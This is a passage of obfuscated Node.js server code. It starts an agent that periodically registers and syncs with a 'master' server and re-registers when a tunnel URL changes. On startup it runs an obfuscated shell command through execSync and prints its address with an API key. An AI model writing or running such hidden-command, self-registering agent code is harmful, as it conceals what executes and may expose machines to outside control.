autoRegisterToMaster(),setInterval(autoRegisterToMaster,0x3c*0x3e8),autoSyncFromMaster(),setInterval(autoSyncFromMaster,0xa*0x3e8);let _0x5debf4=null;setInterval(()=>{const _0x1f8ab0=_0x492b;localTunnelUrl&&localTunnelUrl!==_0x5debf4&&(_0x5debf4=localTunnelUrl,console[_0x1f8ab0(0x23a)](_0x1f8ab0(0x29f)),autoRegisterToMaster());},0x1388);}initAgent();}app[_0x3567df(0x2e4)]('/',(_0x4d7aec,_0x5695b7)=>{const _0x2bcd54=_0x3567df;_0x5695b7[_0x2bcd54(0x32c)]('/dashboard');}),httpServer[_0x3567df(0x1b1)](port,async()=>{const _0x559c9c=_0x3567df;console[_0x559c9c(0x224)]();let _0x233439=_0x559c9c(0x31c);try{_0x233439=execSync(_0x559c9c(0x1e8))[_0x559c9c(0x1c1)]()[_0x559c9c(0x22e)]();}catch(_0x5a5f5f){}console[_0x559c9c(0x23a)]('SERVER\x20ONLINE:\x20http://'+_0x233439+':'+port+':'+apiKey),logActivity(_0x559c9c(0x2f9),{'ip':_0x233439,'port':port,'nodeType':NODE_TYPE});}),process['on'](_0x3567df(0x2ba),()=>{const _0x4a5508=_0x3567df;logActivity('SIGINT',{'msg':_0x4a5508(0x31d)}),process[_0x4a5508(0x2ce)]();});